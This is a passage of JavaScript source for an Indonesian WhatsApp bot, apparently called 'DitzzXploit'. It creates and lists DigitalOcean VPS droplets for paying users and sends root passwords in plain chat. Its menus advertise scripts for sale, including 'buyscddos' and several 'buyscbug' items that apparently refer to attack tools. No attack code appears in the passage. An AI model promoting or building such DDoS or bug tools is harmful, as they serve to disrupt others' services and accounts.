          mesej += `- Droplet Id: ${droplet.id}\n- Hostname: ${droplet.name}\n- Username Login: root\n- IP: ${ipAddress}\n- Ram: ${droplet.memory} MB\n- Cpu: ${droplet.vcpus} CPU\n- OS: ${droplet.image.distribution}\n- Storage: ${droplet.disk} GB\n- Status: ${droplet.status}\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      DitzzXploit.sendMessage(m.chat, { text: mesej });
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
  }

  break;
}
    
 case "cekdroplet": {
  if (!isOwner) return m.reply(`Ngapain? Kepo Amat Dah`);

  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  // Mendapatkan informasi droplet (VPS) berdasarkan ID
  const getDropletInfo = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        const data = await response.json();
        const droplet = data.droplet;
        const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
        const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
        const vpsRam = droplet.memory / 1024;

        return {
          dropletid: droplet.id,
          username: droplet.name,
          ip: ipAddress,
          ram: `${vpsRam} GB`,
          os: droplet.image.distribution,
          cpu: droplet.vcpus > 1 ? `${droplet.vcpus} vCPU` : `${droplet.vcpus} vCPUs`,
          storage: droplet.disk,
          status: droplet.status // Menambahkan status VPS
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal memeriksa detail droplet: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat memeriksa detail droplet:', error.message);
      throw new Error('Terjadi kesalahan saat memeriksa detail droplet.');
    }
  };

  getDropletInfo(dropletId)
    .then((info) => {
      let textku = `*DETAIL VPS ANDA*\nDroplet Id: ${info.dropletid}\nHostname: ${info.username}\nIpv4 : ${info.ip}\nRam : ${info.ram}\nOS : ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus : ${info.status}`;
      DitzzXploit.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      DitzzXploit.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS.' });
    });

  break;
}
       
        
    case "buypaketvps1g1c": {
if (cekSaldo(sender,db_saldo) < 20000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let hostname = args[0];
if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await DitzzXploit.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 20000, db_saldo)
break

    case "buypaketvps2g1c": {
if (cekSaldo(sender,db_saldo) < 25000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await DitzzXploit.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 25000, db_saldo)
break  
 
    case "buypaketvps2g2c": {
if (cekSaldo(sender,db_saldo) < 30000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await DitzzXploit.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 30000, db_saldo)
break      
    case "buypaketvps4g2c": {
if (cekSaldo(sender,db_saldo) < 45000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await DitzzXploit.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 45000, db_saldo)
break        
     case "buypaketvps8g4c": {
if (cekSaldo(sender,db_saldo) < 55000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp55.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await DitzzXploit.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 55000, db_saldo)
break
    case "vps1g1c": {
if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
let hostname = args[0];
if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await DitzzXploit.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break

    case "vps2g1c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await DitzzXploit.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break  
 
    case "vps2g2c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await DitzzXploit.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break      
    case "vps4g2c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await DitzzXploit.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break        
     case "vps8g4c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await DitzzXploit.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break
        case "cmdmenu": {
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▭▬▭( *COMMAND BUYSC* )▭▬▭
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

 ⭔${prefix}buyscbugv1
 ⭔${prefix}buyscbugv2
 ⭔${prefix}buyscbugv3
 ⭔${prefix}buyscv2
 ⭔${prefix}buyscv3
 ⭔${prefix}buyscv3subdo
 ⭔${prefix}buyscv4
 ⭔${prefix}buyscv5
 ⭔${prefix}buyscv6
 ⭔${prefix}buyscv6subdo
 ⭔${prefix}buyscv7otp
 ⭔${prefix}buyscv7addpm2
 ⭔${prefix}buyscjagagrupv1
 ⭔${prefix}buyscjagagrupv2
 ⭔${prefix}buyscpushkontak
 ⭔${prefix}buyschwv191
 ⭔${prefix}buyschwv192
 ⭔${prefix}buyschwv201
 ⭔${prefix}buyschwv202
 ⭔${prefix}buyscpanel
 ⭔${prefix}buyscpushautosave
 ⭔${prefix}buyscjpmv1
 ⭔${prefix}buyscjpmv2
 ⭔${prefix}buyscjpmv3
 ⭔${prefix}buyscvps1
 ⭔${prefix}buyscvps2
 ⭔${prefix}buyscpm2 
 ⭔${prefix}buyscthemav1
 ⭔${prefix}buyscthemav2
 ⭔${prefix}buyscnowa
 ⭔${prefix}buyscwebp
 ⭔${prefix}buysctesmoni
 ⭔${prefix}buyscddos
 ⭔${prefix}buymodule
 ⭔${prefix}buyscbukaenc

*SEANDAINYA BOT TIDAK MERESPON SEGERA HUBUNGI OWNER*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: textoto, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
        case "payment": case "pay": {
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▬▭( *ALL OTOMATIS* )▭▬
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

⭔ ${prefix}dana
⭔ ${prefix}gopay ( Sedang Proses Bep🥰 ) 
⭔ ${prefix}orkut
⭔ ${prefix}qris
⭔ ${prefix}bri

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: textoto, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break 
        case "vps": {
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▬▭( *LIST VPS BY Zans OFFCIAL* )▭▬
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

⭔ VPS RAM 2GB CORE 1 : 25K
⭔ VPS RAM 2GB CORE 2 : 35K
⭔ VPS RAM 4GB CORE 2 : 45K
⭔ VPS RAM 8GB CORE 4 : 55K
⭔ VPS RAM 16GB CORE 8 : MASIH PROSES

*NOTE : Hubungi Owner!!*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: textoto, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break 
        case "jasa": {
const owned = `6283842671582@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▬▭( *LIST JASA BY Zans Official* )▭▬
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

⭔ JASA INSTALL SERVER : 10K
⭔ JASA INSTALL THEMA. : 5K
⭔ JASA FIX SC : 20K
⭔ JASA EDIT SC  : 15K

*NOTE : Hubungi Owner!!*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: textoto, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break 
case "adminpanel": {
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *ADMIN PANEL* )▭▬▭

⭔${prefix}buyadminpanel
⭔${prefix}panelprem

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "filesc": {
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *FILE SC* )▭▬▭

ReadMe.txt
Sc+v3.zip
all
appearance.js
connect.js
database
freya
node_modules
package-lock.json
package.json
scrape
session
testimoni
thumb.png
v3²

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "buyadminpanel": {
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *BUY ADMIN PANEL* )▭▬▭

*NEED ADMIN PANEL KAK ? PM OWNER DIBAWAH*

*NO OWNER : wa.me/6281802527761*
*PEMBAYARAN VIA :*
*-QRIS*
*-GOPAY*
*-BRI*

*LINK GRUP OWNER :*
https://chat.whatsapp.com/HswTlbKiShB6ai87JZKRK6

*NOTE : SEANDAI NYA OWNER TIDAK MERESPON MOHON BERSABAR MUNGKIN OWNER KU SIBUK, TERIMAKASIH*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "infosc":
owned = `${namaCreator}@s.whatsapp.net`
